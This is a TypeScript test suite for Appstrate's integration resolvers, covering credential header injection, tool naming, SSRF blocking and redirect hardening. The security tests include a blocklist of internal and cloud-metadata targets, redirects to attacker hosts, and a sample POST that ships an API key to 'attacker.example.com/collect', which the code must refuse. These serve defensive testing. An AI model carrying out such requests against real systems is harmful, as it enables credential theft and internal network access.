// SPDX-License-Identifier: Apache-2.0
// Copyright 2026 Appstrate

import { describe, it, expect } from "bun:test";
import {
  LocalIntegrationResolver,
  RemoteAppstrateIntegrationResolver,
  readIntegrationRefs,
  readApiCallIntegrationMetas,
  apiCallToolName,
  type Bundle,
  type BundlePackage,
  type RunEvent,
  type ToolContext,
} from "../../src/resolvers/index.ts";
import {
  BUNDLE_FORMAT_VERSION,
  bundleIntegrity,
  computeRecordEntries,
  recordIntegrity,
  serializeRecord,
  type PackageIdentity,
} from "../../src/bundle/index.ts";

const enc = new TextEncoder();

function makePackage(
  name: `@${string}/${string}`,
  version: string,
  type: "agent" | "integration",
  files: Record<string, string>,
  extraManifest: Record<string, unknown> = {},
): BundlePackage {
  const identity = `${name}@${version}` as PackageIdentity;
  const manifest = { name, version, type, ...extraManifest };
  const filesMap = new Map<string, Uint8Array>();
  filesMap.set("manifest.json", enc.encode(JSON.stringify(manifest)));
  for (const [k, v] of Object.entries(files)) filesMap.set(k, enc.encode(v));
  const integrity = recordIntegrity(serializeRecord(computeRecordEntries(filesMap)));
  return { identity, manifest, files: filesMap, integrity };
}

function makeBundle(root: BundlePackage, deps: BundlePackage[] = []): Bundle {
  const packages = new Map<PackageIdentity, BundlePackage>();
  packages.set(root.identity, root);
  for (const d of deps) packages.set(d.identity, d);
  const pkgIndex = new Map<PackageIdentity, { path: string; integrity: string }>();
  for (const p of packages.values()) {
    pkgIndex.set(p.identity, {
      path: `packages/${(p.manifest as { name: string }).name}/${(p.manifest as { version: string }).version}/`,
      integrity: p.integrity,
    });
  }
  return {
    bundleFormatVersion: BUNDLE_FORMAT_VERSION,
    root: root.identity,
    packages,
    integrity: bundleIntegrity(pkgIndex),
  };
}

function makeCtx(): { ctx: ToolContext; events: RunEvent[] } {
  const events: RunEvent[] = [];
  return {
    events,
    ctx: {
      emit: (e) => {
        events.push(e);
      },
      workspace: "/tmp",
      runId: "run_test",
      toolCallId: "call_1",
      signal: new AbortController().signal,
    },
  };
}

/** apiCall integration manifest helper (api_key auth with delivery.http). */
function apiKeyIntegrationManifest(
  _name: `@${string}/${string}`,
  opts: { authorizedUris?: string[]; allowAllUris?: boolean; headerName?: string } = {},
) {
  return {
    integration: {
      schema_version: "0.1",
      type: "integration",
      source: { kind: "none" },
      _meta: { "dev.appstrate/api": { auths: { main: {} } } },
      auths: {
        main: {
          type: "api_key",
          authorized_uris: opts.authorizedUris ?? ["https://api.acme.com/**"],
          ...(opts.allowAllUris ? { allow_all_uris: true } : {}),
          credentials: { schema: {} },
          delivery: {
            http: {
              in: "header",
              name: opts.headerName ?? "X-Api-Key",
              value: "{$credential.api_key}",
            },
          },
        },
      },
    },
  };
}

describe("readIntegrationRefs", () => {
  it("reads dependencies.integrations as { name, version }[]", () => {
    const root = makePackage(
      "@acme/agent",
      "1.0.0",
      "agent",
      {},
      {
        dependencies: { integrations: { "@acme/api": "^1.0.0", "@x/y": "2.0.0" } },
      },
    );
    const bundle = makeBundle(root);
    const refs = readIntegrationRefs(bundle);
    expect(refs).toEqual([
      { name: "@acme/api", version: "^1.0.0" },
      { name: "@x/y", version: "2.0.0" },
    ]);
  });

  it("returns [] when no integrations declared", () => {
    const root = makePackage("@acme/agent", "1.0.0", "agent", {});
    expect(readIntegrationRefs(makeBundle(root))).toEqual([]);
  });

  it("reads AFPS §4.1 semver-string integration deps", () => {
    const root = makePackage(
      "@acme/agent",
      "1.0.0",
      "agent",
      {},
      {
        dependencies: {
          integrations: {
            "@acme/api": "^1.0.0",
            "@acme/other": "^2.0.0",
          },
        },
        integrations_configuration: {
          "@acme/other": { scopes: ["s1"], auth_key: "oauth" },
        },
      },
    );
    const refs = readIntegrationRefs(makeBundle(root));
    expect(refs).toEqual([
      { name: "@acme/api", version: "^1.0.0" },
      { name: "@acme/other", version: "^2.0.0" },
    ]);
  });

  it("skips integration deps with non-string and missing `version`", () => {
    const root = makePackage(
      "@acme/agent",
      "1.0.0",
      "agent",
      {},
      {
        dependencies: {
          integrations: {
            "@acme/ok": "^1.0.0",
            "@acme/bad-no-version": { scopes: ["s"] },
            "@acme/bad-typed": 42,
          } as unknown as Record<string, unknown>,
        },
      },
    );
    const refs = readIntegrationRefs(makeBundle(root));
    expect(refs).toEqual([{ name: "@acme/ok", version: "^1.0.0" }]);
  });
});

describe("readApiCallIntegrationMetas", () => {
  it("projects authKey, authType, authorizedUris, delivery.http from the manifest", () => {
    const root = makePackage("@acme/agent", "1.0.0", "agent", {});
    const integ = makePackage("@acme/api", "1.0.0", "integration", {
      "integration.json": JSON.stringify(apiKeyIntegrationManifest("@acme/api").integration),
    });
    const bundle = makeBundle(root, [integ]);
    const metas = readApiCallIntegrationMetas(bundle, { name: "@acme/api", version: "^1" });
    expect(metas).toHaveLength(1);
    const meta = metas[0]!;
    expect(meta.authKey).toBe("main");
    expect(meta.authType).toBe("api_key");
    expect(meta.authorizedUris).toEqual(["https://api.acme.com/**"]);
    expect(meta.allowAllUris).toBe(false);
    expect(meta.http?.headerName).toBe("X-Api-Key");
    expect(apiCallToolName(meta)).toBe("acme_api__api_call");
  });

  it("returns [] for an integration with no apiCall (pure MCP server)", () => {
    const root = makePackage("@acme/agent", "1.0.0", "agent", {});
    const integ = makePackage("@acme/mcp", "1.0.0", "integration", {
      "integration.json": JSON.stringify({
        schema_version: "0.1",
        type: "integration",
        source: { kind: "local", server: { name: "@acme/mcp-server", version: "^1.0.0" } },
        auths: {
          main: {
            type: "oauth2",
            authorized_uris: ["https://x/**"],
            delivery: {
              http: {
                in: "header",
                name: "Authorization",
                prefix: "Bearer ",
                value: "{$credential.access_token}",
              },
            },
          },
        },
      }),
    });
    const bundle = makeBundle(root, [integ]);
    expect(readApiCallIntegrationMetas(bundle, { name: "@acme/mcp", version: "^1" })).toEqual([]);
  });

  it("resolves the auth named by the api_call _meta block", () => {
    const root = makePackage("@acme/agent", "1.0.0", "agent", {});
    const integ = makePackage("@acme/api", "1.0.0", "integration", {
      "integration.json": JSON.stringify({
        schema_version: "0.1",
        type: "integration",
        source: { kind: "none" },
        _meta: { "dev.appstrate/api": { auths: { only: {} } } },
        auths: {
          only: {
            type: "api_key",
            authorized_uris: ["https://api.acme.com/**"],
            delivery: {
              http: { in: "header", name: "X-Api-Key", value: "{$credential.api_key}" },
            },
          },
        },
      }),
    });
    const bundle = makeBundle(root, [integ]);
    const metas = readApiCallIntegrationMetas(bundle, { name: "@acme/api", version: "^1" });
    expect(metas[0]!.authKey).toBe("only");
  });

  it("emits one meta per opted-in auth with api_call__{authToken} tool names (multi-auth)", () => {
    const root = makePackage("@acme/agent", "1.0.0", "agent", {});
    const integ = makePackage("@acme/multi", "1.0.0", "integration", {
      "integration.json": JSON.stringify({
        schema_version: "0.1",
        type: "integration",
        source: { kind: "none" },
        _meta: { "dev.appstrate/api": { auths: { main: {}, alt: {} } } },
        auths: {
          main: {
            type: "api_key",
            authorized_uris: ["https://api.acme.com/**"],
            delivery: {
              http: { in: "header", name: "X-Api-Key", value: "{$credential.api_key}" },
            },
          },
          alt: {
            type: "api_key",
            authorized_uris: ["https://alt.acme.com/**"],
            delivery: {
              http: { in: "header", name: "X-Alt-Key", value: "{$credential.api_key}" },
            },
          },
        },
      }),
    });
    const bundle = makeBundle(root, [integ]);
    const metas = readApiCallIntegrationMetas(bundle, { name: "@acme/multi", version: "^1" });
    expect(metas).toHaveLength(2);
    expect(metas.map((m) => m.toolName).sort()).toEqual(["api_call__alt", "api_call__main"]);
    expect(metas.map((m) => apiCallToolName(m)).sort()).toEqual([
      "acme_multi__api_call__alt",
      "acme_multi__api_call__main",
    ]);
  });

  it("matches platform naming for long auth keys and long package namespaces", () => {
    const packageName = "@scope-with-long-name/integration-with-long-name";
    const longAuthKey = "authentication_key_that_is_valid_but_long";
    const auth = (host: string) => ({
      type: "api_key",
      authorized_uris: [`https://${host}/**`],
      delivery: {
        http: { in: "header", name: "X-Api-Key", value: "{$credential.api_key}" },
      },
    });
    const root = makePackage("@acme/agent", "1.0.0", "agent", {});
    const integ = makePackage(packageName, "1.0.0", "integration", {
      "integration.json": JSON.stringify({
        schema_version: "0.1",
        type: "integration",
        source: { kind: "none" },
        _meta: {
          "dev.appstrate/api": { auths: { short: {}, [longAuthKey]: {} } },
        },
        auths: {
          short: auth("short.example.com"),
          [longAuthKey]: auth("long.example.com"),
        },
      }),
    });
    const bundle = makeBundle(root, [integ]);
    const meta = readApiCallIntegrationMetas(bundle, { name: packageName, version: "^1" }).find(
      (entry) => entry.authKey === longAuthKey,
    )!;

    expect(meta.namespace).toBe("scope_with_long_name");
    expect(meta.toolName).toBe("api_call__h0a0593260c3968fd8");
    expect(apiCallToolName(meta).length).toBeLessThanOrEqual(56);
  });

  // ── toHttpDeliveryConfig branches ──
  // The `delivery.http.value` template is lowered onto the resolver's
  // `HttpDeliveryConfig.valueFrom`. A single `{$credential.field}` with no
  // encoding lowers to a bare field name; encoding or multi-ref values keep
  // the `{{field}}` template form.

  it("lowers a single {$credential.field} (no encoding) to a bare valueFrom field name", () => {
    const root = makePackage("@acme/agent", "1.0.0", "agent", {});
    const integ = makePackage("@acme/api", "1.0.0", "integration", {
      "integration.json": JSON.stringify(apiKeyIntegrationManifest("@acme/api").integration),
    });
    const bundle = makeBundle(root, [integ]);
    const meta = readApiCallIntegrationMetas(bundle, { name: "@acme/api", version: "^1" })[0]!;
    // Single-ref fast path: lowered to a bare field name (not a template object).
    expect(meta.http?.valueFrom).toBe("api_key");
  });

  it("keeps encoding=base64 as a { template, encoding } valueFrom", () => {
    const root = makePackage("@acme/agent", "1.0.0", "agent", {});
    const integ = makePackage("@acme/b64", "1.0.0", "integration", {
      "integration.json": JSON.stringify({
        schema_version: "0.1",
        type: "integration",
        source: { kind: "none" },
        _meta: { "dev.appstrate/api": { auths: { main: {} } } },
        auths: {
          main: {
            type: "api_key",
            authorized_uris: ["https://api.acme.com/**"],
            delivery: {
              http: {
                in: "header",
                name: "Authorization",
                // Single credential ref BUT with base64 encoding — the single-ref
                // fast path is skipped, so the value stays a template object that
                // carries the encoding hint downstream.
                value: "{$credential.api_key}",
                encoding: "base64",
              },
            },
          },
        },
      }),
    });
    const bundle = makeBundle(root, [integ]);
    const meta = readApiCallIntegrationMetas(bundle, { name: "@acme/b64", version: "^1" })[0]!;
    expect(meta.http?.valueFrom).toEqual({ template: "{{api_key}}", encoding: "base64" });
  });

  it("rewrites a value with two {$credential.*} refs into {{field}} template syntax", () => {
    const root = makePackage("@acme/agent", "1.0.0", "agent", {});
    const integ = makePackage("@acme/basic", "1.0.0", "integration", {
      "integration.json": JSON.stringify({
        schema_version: "0.1",
        type: "integration",
        source: { kind: "none" },
        _meta: { "dev.appstrate/api": { auths: { main: {} } } },
        auths: {
          main: {
            type: "basic",
            authorized_uris: ["https://api.acme.com/**"],
            delivery: {
              http: {
                in: "header",
                name: "Authorization",
                prefix: "Basic ",
                // Two refs → multi-ref path → template rewrite to `{{field}}`.
                value: "{$credential.username}:{$credential.password}",
              },
            },
          },
        },
      }),
    });
    const bundle = makeBundle(root, [integ]);
    const meta = readApiCallIntegrationMetas(bundle, { name: "@acme/basic", version: "^1" })[0]!;
    expect(meta.http?.valueFrom).toEqual({ template: "{{username}}:{{password}}" });
  });
});

describe("LocalIntegrationResolver", () => {
  it("allocates colliding projected namespaces with the same suffix contract as McpHost", async () => {
    const first = "@scope-with-long-name/integration-one" as const;
    const second = "@scope-with-long-name/integration-two" as const;
    const root = makePackage("@acme/agent", "1.0.0", "agent", {});
    const packages = [first, second].map((name) =>
      makePackage(name, "1.0.0", "integration", {
        "integration.json": JSON.stringify(apiKeyIntegrationManifest(name).integration),
      }),
    );
    const bundle = makeBundle(root, packages);
    const resolver = new LocalIntegrationResolver({
      creds: {
        version: 1,
        integrations: {
          [first]: { fields: { api_key: "first" } },
          [second]: { fields: { api_key: "second" } },
        },
      },
    });

    const tools = await resolver.resolve(
      [
        { name: first, version: "^1" },
        { name: second, version: "^1" },
      ],
      bundle,
    );
    expect(tools.map((tool) => tool.name)).toEqual([
      "scope_with_long_name__api_call",
      "scope_with_long_name_2__api_call",
    ]);
  });

  it("injects the api_key header via the manifest delivery.http plan", async () => {
    const calls: { url: string; init: RequestInit }[] = [];
    const root = makePackage("@acme/agent", "1.0.0", "agent", {});
    const integ = makePackage("@acme/api", "1.0.0", "integration", {
      "integration.json": JSON.stringify(apiKeyIntegrationManifest("@acme/api").integration),
    });
    const bundle = makeBundle(root, [integ]);
    const resolver = new LocalIntegrationResolver({
      resolveHost: async () => ["203.0.113.7"],
      creds: { version: 1, integrations: { "@acme/api": { fields: { api_key: "secret" } } } },
      fetch: ((url: string, init: RequestInit) => {
        calls.push({ url, init });
        return Promise.resolve(new Response("{}", { status: 200 }));
      }) as typeof fetch,
    });
    const tools = await resolver.resolve([{ name: "@acme/api", version: "^1" }], bundle);
    expect(tools).toHaveLength(1);
    expect(tools[0]!.name).toBe("acme_api__api_call");
    const { ctx } = makeCtx();
    await tools[0]!.execute({ method: "GET", target: "https://api.acme.com/v1/me" }, ctx);
    const h = calls[0]!.init.headers as Record<string, string>;
    expect(h["X-Api-Key"]).toBe("secret");
  });

  it("injects oauth2 Bearer by default and substitutes {{var}} in the URL", async () => {
    const calls: { url: string; init: RequestInit }[] = [];
    const root = makePackage("@acme/agent", "1.0.0", "agent", {});
    const integ = makePackage("@acme/oauth", "1.0.0", "integration", {
      "integration.json": JSON.stringify({
        schema_version: "0.1",
        type: "integration",
        source: { kind: "none" },
        _meta: { "dev.appstrate/api": { auths: { main: {} } } },
        auths: {
          main: {
            type: "oauth2",
            authorization_endpoint: "https://x/auth",
            token_endpoint: "https://x/token",
            authorized_uris: ["https://{{subdomain}}.acme.com/**", "https://eu.acme.com/**"],
            delivery: {
              http: {
                in: "header",
                name: "Authorization",
                prefix: "Bearer ",
                value: "{$credential.access_token}",
              },
            },
          },
        },
      }),
    });
    const bundle = makeBundle(root, [integ]);
    const resolver = new LocalIntegrationResolver({
      resolveHost: async () => ["203.0.113.7"],
      creds: {
        version: 1,
        integrations: {
          "@acme/oauth": { fields: { access_token: "tok", subdomain: "eu" } },
        },
      },
      fetch: ((url: string, init: RequestInit) => {
        calls.push({ url, init });
        return Promise.resolve(new Response("{}", { status: 200 }));
      }) as typeof fetch,
    });
    const tools = await resolver.resolve([{ name: "@acme/oauth", version: "^1" }], bundle);
    const { ctx } = makeCtx();
    await tools[0]!.execute({ method: "GET", target: "https://{{subdomain}}.acme.com/me" }, ctx);
    expect(calls[0]!.url).toBe("https://eu.acme.com/me");
    const h = calls[0]!.init.headers as Record<string, string>;
    expect(h["Authorization"]).toBe("Bearer tok");
  });

  it("enforces authorizedUris from the manifest (no allowAllUris)", async () => {
    const root = makePackage("@acme/agent", "1.0.0", "agent", {});
    const integ = makePackage("@acme/api", "1.0.0", "integration", {
      "integration.json": JSON.stringify(apiKeyIntegrationManifest("@acme/api").integration),
    });
    const bundle = makeBundle(root, [integ]);
    const resolver = new LocalIntegrationResolver({
      resolveHost: async () => ["203.0.113.7"],
      creds: { version: 1, integrations: { "@acme/api": { fields: { api_key: "secret" } } } },
      fetch: (() =>
        Promise.resolve(new Response("{}", { status: 200 }))) as unknown as typeof fetch,
    });
    const tools = await resolver.resolve([{ name: "@acme/api", version: "^1" }], bundle);
    const { ctx } = makeCtx();
    await expect(
      tools[0]!.execute({ method: "GET", target: "https://evil.example.com/x" }, ctx),
    ).rejects.toThrow(/not in authorized_uris/);
  });

  it("strips a caller-supplied header of the same name (allowServerOverride default false)", async () => {
    const calls: { url: string; init: RequestInit }[] = [];
    const root = makePackage("@acme/agent", "1.0.0", "agent", {});
    const integ = makePackage("@acme/api", "1.0.0", "integration", {
      "integration.json": JSON.stringify(apiKeyIntegrationManifest("@acme/api").integration),
    });
    const bundle = makeBundle(root, [integ]);
    const resolver = new LocalIntegrationResolver({
      resolveHost: async () => ["203.0.113.7"],
      creds: { version: 1, integrations: { "@acme/api": { fields: { api_key: "real" } } } },
      fetch: ((url: string, init: RequestInit) => {
        calls.push({ url, init });
        return Promise.resolve(new Response("{}", { status: 200 }));
      }) as typeof fetch,
    });
    const tools = await resolver.resolve([{ name: "@acme/api", version: "^1" }], bundle);
    const { ctx } = makeCtx();
    await tools[0]!.execute(
      { method: "GET", target: "https://api.acme.com/v1/me", headers: { "x-api-key": "forged" } },
      ctx,
    );
    const h = calls[0]!.init.headers as Record<string, string>;
    // Only the injected value survives.
    const apiKeyHeaders = Object.entries(h).filter(([k]) => k.toLowerCase() === "x-api-key");
    expect(apiKeyHeaders).toHaveLength(1);
    expect(apiKeyHeaders[0]![1]).toBe("real");
  });

  it("honours an explicit injection override from the creds file", async () => {
    const calls: { url: string; init: RequestInit }[] = [];
    const root = makePackage("@acme/agent", "1.0.0", "agent", {});
    const integ = makePackage("@acme/api", "1.0.0", "integration", {
      "integration.json": JSON.stringify(apiKeyIntegrationManifest("@acme/api").integration),
    });
    const bundle = makeBundle(root, [integ]);
    const resolver = new LocalIntegrationResolver({
      resolveHost: async () => ["203.0.113.7"],
      creds: {
        version: 1,
        integrations: {
          "@acme/api": {
            fields: { api_key: "secret" },
            injection: { headerName: "Authorization", headerPrefix: "Token " },
          },
        },
      },
      fetch: ((url: string, init: RequestInit) => {
        calls.push({ url, init });
        return Promise.resolve(new Response("{}", { status: 200 }));
      }) as typeof fetch,
    });
    const tools = await resolver.resolve([{ name: "@acme/api", version: "^1" }], bundle);
    const { ctx } = makeCtx();
    await tools[0]!.execute({ method: "GET", target: "https://api.acme.com/v1/me" }, ctx);
    const h = calls[0]!.init.headers as Record<string, string>;
    expect(h["Authorization"]).toBe("Token secret");
  });

  it("skips integrations without apiCall and fails on missing creds", async () => {
    const root = makePackage("@acme/agent", "1.0.0", "agent", {});
    const integ = makePackage("@acme/api", "1.0.0", "integration", {
      "integration.json": JSON.stringify(apiKeyIntegrationManifest("@acme/api").integration),
    });
    const bundle = makeBundle(root, [integ]);
    const resolver = new LocalIntegrationResolver({
      resolveHost: async () => ["203.0.113.7"],
      creds: { version: 1, integrations: {} },
    });
    await expect(resolver.resolve([{ name: "@acme/api", version: "^1" }], bundle)).rejects.toThrow(
      /no credentials found/,
    );
  });
});

// The local resolver now routes upstream calls through the shared
// outbound-HTTP engine (`api-call-engine.ts`), gaining the SSRF blocklist
// + manual redirect-follower the platform sidecar already had. Previously
// it did a raw `fetch(target, …)` with default `redirect: "follow"` and NO
// SSRF check — these tests pin the closed gap.
describe("LocalIntegrationResolver — SSRF + redirect hardening (newly added on the CLI path)", () => {
  function allowAllManifest(name: `@${string}/${string}`) {
    return makePackage(name, "1.0.0", "integration", {
      "integration.json": JSON.stringify(
        apiKeyIntegrationManifest(name, { allowAllUris: true }).integration,
      ),
    });
  }

  function narrowAllowlistManifest(name: `@${string}/${string}`, authorizedUris: string[]) {
    return makePackage(name, "1.0.0", "integration", {
      "integration.json": JSON.stringify(
        apiKeyIntegrationManifest(name, { authorizedUris }).integration,
      ),
    });
  }

  // Even with allow_all_uris (the tool-layer authorized_uris gate is a
  // no-op), the engine's SSRF preflight must refuse internal targets.
  const blockedTargets = [
    "http://169.254.169.254/latest/meta-data/", // AWS/GCP metadata
    "http://127.0.0.1:8080/admin", // loopback
    "http://localhost/secret",
    "http://10.0.0.5/internal", // RFC1918
    "http://[::1]/x", // IPv6 loopback
    "http://metadata.google.internal/computeMetadata/v1/", // GCP metadata host
  ];
  for (const target of blockedTargets) {
    it(`refuses SSRF-blocked target ${target} before any outbound fetch`, async () => {
      let fetched = false;
      const root = makePackage("@acme/agent", "1.0.0", "agent", {});
      const bundle = makeBundle(root, [allowAllManifest("@acme/api")]);
      const resolver = new LocalIntegrationResolver({
        resolveHost: async () => ["203.0.113.7"],
        creds: { version: 1, integrations: { "@acme/api": { fields: { api_key: "secret" } } } },
        fetch: (() => {
          fetched = true;
          return Promise.resolve(new Response("{}", { status: 200 }));
        }) as unknown as typeof fetch,
      });
      const tools = await resolver.resolve([{ name: "@acme/api", version: "^1" }], bundle);
      const { ctx } = makeCtx();
      await expect(tools[0]!.execute({ method: "GET", target }, ctx)).rejects.toThrow(
        /blocked network range/,
      );
      // No outbound bytes — the SSRF preflight fires before fetch.
      expect(fetched).toBe(false);
    });
  }

  it("follows a same-host redirect and returns the terminal response", async () => {
    const seen: string[] = [];
    const root = makePackage("@acme/agent", "1.0.0", "agent", {});
    const bundle = makeBundle(root, [
      narrowAllowlistManifest("@acme/api", ["https://api.acme.com/**"]),
    ]);
    const resolver = new LocalIntegrationResolver({
      resolveHost: async () => ["203.0.113.7"],
      creds: { version: 1, integrations: { "@acme/api": { fields: { api_key: "secret" } } } },
      fetch: ((url: string) => {
        seen.push(url);
        if (url === "https://api.acme.com/v1/old") {
          return Promise.resolve(
            new Response(null, {
              status: 302,
              headers: { location: "https://api.acme.com/v1/new" },
            }),
          );
        }
        return Promise.resolve(
          new Response(JSON.stringify({ ok: true }), {
            status: 200,
            headers: { "content-type": "application/json" },
          }),
        );
      }) as typeof fetch,
    });
    const tools = await resolver.resolve([{ name: "@acme/api", version: "^1" }], bundle);
    const { ctx } = makeCtx();
    const res = await tools[0]!.execute(
      { method: "GET", target: "https://api.acme.com/v1/old" },
      ctx,
    );
    // The follower chased the 302 to the final 200.
    expect(seen).toEqual(["https://api.acme.com/v1/old", "https://api.acme.com/v1/new"]);
    const body = JSON.parse((res.content[0] as { text: string }).text) as { status: number };
    expect(body.status).toBe(200);
  });

  it("refuses a redirect hop that leaves the authorized_uris allowlist", async () => {
    const seen: string[] = [];
    const root = makePackage("@acme/agent", "1.0.0", "agent", {});
    const bundle = makeBundle(root, [
      narrowAllowlistManifest("@acme/api", ["https://api.acme.com/**"]),
    ]);
    const resolver = new LocalIntegrationResolver({
      resolveHost: async () => ["203.0.113.7"],
      creds: { version: 1, integrations: { "@acme/api": { fields: { api_key: "secret" } } } },
      fetch: ((url: string) => {
        seen.push(url);
        // First (allowed) hop redirects OFF the allowlist to an attacker host.
        return Promise.resolve(
          new Response(null, {
            status: 302,
            headers: { location: "https://evil.attacker.com/steal" },
          }),
        );
      }) as typeof fetch,
    });
    const tools = await resolver.resolve([{ name: "@acme/api", version: "^1" }], bundle);
    const { ctx } = makeCtx();
    await expect(
      tools[0]!.execute({ method: "GET", target: "https://api.acme.com/v1/me" }, ctx),
    ).rejects.toThrow(/redirect blocked/i);
    // Only the initial (allowed) hop was issued — the off-allowlist hop
    // was refused before re-issuing the fetch.
    expect(seen).toEqual(["https://api.acme.com/v1/me"]);
  });

  it("refuses a redirect hop pointing at an SSRF-blocked target (allow_all_uris)", async () => {
    const seen: string[] = [];
    const root = makePackage("@acme/agent", "1.0.0", "agent", {});
    const bundle = makeBundle(root, [allowAllManifest("@acme/api")]);
    const resolver = new LocalIntegrationResolver({
      resolveHost: async () => ["203.0.113.7"],
      creds: { version: 1, integrations: { "@acme/api": { fields: { api_key: "secret" } } } },
      fetch: ((url: string) => {
        seen.push(url);
        // Public first hop redirects to the cloud metadata endpoint — the
        // classic SSRF-via-redirect pivot. allow_all_uris must NOT permit it.
        return Promise.resolve(
          new Response(null, {
            status: 302,
            headers: { location: "http://169.254.169.254/latest/meta-data/" },
          }),
        );
      }) as typeof fetch,
    });
    const tools = await resolver.resolve([{ name: "@acme/api", version: "^1" }], bundle);
    const { ctx } = makeCtx();
    await expect(
      tools[0]!.execute({ method: "GET", target: "https://public.example.com/start" }, ctx),
    ).rejects.toThrow(/redirect blocked/i);
    expect(seen).toEqual(["https://public.example.com/start"]);
  });

  it("strips the injected credential header on an off-boundary cross-origin redirect (allow_all_uris)", async () => {
    const inits: { url: string; headers: Record<string, string> }[] = [];
    const root = makePackage("@acme/agent", "1.0.0", "agent", {});
    const bundle = makeBundle(root, [allowAllManifest("@acme/api")]);
    const resolver = new LocalIntegrationResolver({
      resolveHost: async () => ["203.0.113.7"],
      creds: { version: 1, integrations: { "@acme/api": { fields: { api_key: "secret" } } } },
      fetch: ((url: string, init: RequestInit) => {
        inits.push({ url, headers: { ...((init.headers as Record<string, string>) ?? {}) } });
        if (url === "https://a.example.com/start") {
          return Promise.resolve(
            new Response(null, {
              status: 302,
              headers: { location: "https://b.example.com/next" },
            }),
          );
        }
        return Promise.resolve(new Response("{}", { status: 200 }));
      }) as typeof fetch,
    });
    const tools = await resolver.resolve([{ name: "@acme/api", version: "^1" }], bundle);
    const { ctx } = makeCtx();
    await tools[0]!.execute({ method: "GET", target: "https://a.example.com/start" }, ctx);
    // Hop 1 carries the injected credential; hop 2 (cross-origin, no
    // declared allowlist) must have it stripped (WHATWG origin-strip).
    const hop1 = inits.find((i) => i.url === "https://a.example.com/start")!;
    const hop2 = inits.find((i) => i.url === "https://b.example.com/next")!;
    const hop1Key = Object.entries(hop1.headers).find(([k]) => k.toLowerCase() === "x-api-key");
    const hop2Key = Object.entries(hop2.headers).find(([k]) => k.toLowerCase() === "x-api-key");
    expect(hop1Key?.[1]).toBe("secret");
    expect(hop2Key).toBeUndefined();
  });

  it("refuses a {{field}} credential substitution toward a PUBLIC host when allow_all_uris is the only permission", async () => {
    // Downgrading allowAllUris alone is not enough: with no authorized_uris
    // the preflight would fall back to the internal-host SSRF net and the
    // secret would still ship to any public attacker host. The resolver must
    // refuse outright — same semantics as the sidecar's 403.
    let fetched = 0;
    const root = makePackage("@acme/agent", "1.0.0", "agent", {});
    // allow_all_uris with NO authorized_uris — the normal allow-all shape.
    const bundle = makeBundle(root, [
      makePackage("@acme/api", "1.0.0", "integration", {
        "integration.json": JSON.stringify(
          apiKeyIntegrationManifest("@acme/api", { allowAllUris: true, authorizedUris: [] })
            .integration,
        ),
      }),
    ]);
    const resolver = new LocalIntegrationResolver({
      resolveHost: async () => ["203.0.113.7"],
      creds: { version: 1, integrations: { "@acme/api": { fields: { api_key: "secret" } } } },
      fetch: (() => {
        fetched += 1;
        return Promise.resolve(new Response("{}", { status: 200 }));
      }) as unknown as typeof fetch,
    });
    const tools = await resolver.resolve([{ name: "@acme/api", version: "^1" }], bundle);
    const { ctx } = makeCtx();
    await expect(
      tools[0]!.execute(
        {
          method: "POST",
          target: "https://attacker.example.com/collect",
          body: "key={{api_key}}",
        },
        ctx,
      ),
    ).rejects.toMatchObject({ code: "RESOLVER_CREDENTIAL_EXFIL_BLOCKED" });
    expect(fetched).toBe(0); // refused before any outbound bytes
  });
});

describe("RemoteAppstrateIntegrationResolver", () => {
  it("POSTs to /api/credential-proxy/proxy with X-Integration-Id = integration id", async () => {
    const calls: { url: string; init: RequestInit }[] = [];
    const root = makePackage("@acme/agent", "1.0.0", "agent", {});
    const integ = makePackage("@acme/api", "1.0.0", "integration", {
      "integration.json": JSON.stringify(apiKeyIntegrationManifest("@acme/api").integration),
    });
    const bundle = makeBundle(root, [integ]);
    const resolver = new RemoteAppstrateIntegrationResolver({
      instance: "https://app.appstrate.com",
      apiKey: "ask_test",
      applicationId: "app_1",
      orgId: "org_1",
      sessionId: "sess_1",
      fetch: ((url: string, init: RequestInit) => {
        calls.push({ url, init });
        return Promise.resolve(new Response("{}", { status: 200 }));
      }) as typeof fetch,
    });
    const tools = await resolver.resolve([{ name: "@acme/api", version: "^1" }], bundle);
    expect(tools[0]!.name).toBe("acme_api__api_call");
    const { ctx } = makeCtx();
    await tools[0]!.execute({ method: "GET", target: "https://api.acme.com/v1/me" }, ctx);
    expect(calls[0]!.url).toBe("https://app.appstrate.com/api/credential-proxy/proxy");
    const h = calls[0]!.init.headers as Record<string, string>;
    expect(h.Authorization).toBe("Bearer ask_test");
    expect(h["X-Application-Id"]).toBe("app_1");
    expect(h["X-Org-Id"]).toBe("org_1");
    expect(h["X-Integration-Id"]).toBe("@acme/api");
    expect(h["X-Target"]).toBe("https://api.acme.com/v1/me");
  });

  it("does not enforce authorizedUris locally (platform gates server-side)", async () => {
    const calls: { url: string; init: RequestInit }[] = [];
    const root = makePackage("@acme/agent", "1.0.0", "agent", {});
    const integ = makePackage("@acme/api", "1.0.0", "integration", {
      "integration.json": JSON.stringify(apiKeyIntegrationManifest("@acme/api").integration),
    });
    const bundle = makeBundle(root, [integ]);
    const resolver = new RemoteAppstrateIntegrationResolver({
      instance: "https://app.appstrate.com",
      apiKey: "ask_test",
      applicationId: "app_1",
      fetch: ((url: string, init: RequestInit) => {
        calls.push({ url, init });
        return Promise.resolve(new Response("{}", { status: 200 }));
      }) as typeof fetch,
    });
    const tools = await resolver.resolve([{ name: "@acme/api", version: "^1" }], bundle);
    const { ctx } = makeCtx();
    // off-allowlist target — must NOT throw locally; proxy decides.
    await tools[0]!.execute({ method: "GET", target: "https://anything.example.com/x" }, ctx);
    expect(calls).toHaveLength(1);
    const h = calls[0]!.init.headers as Record<string, string>;
    expect(h["X-Target"]).toBe("https://anything.example.com/x");
  });
});
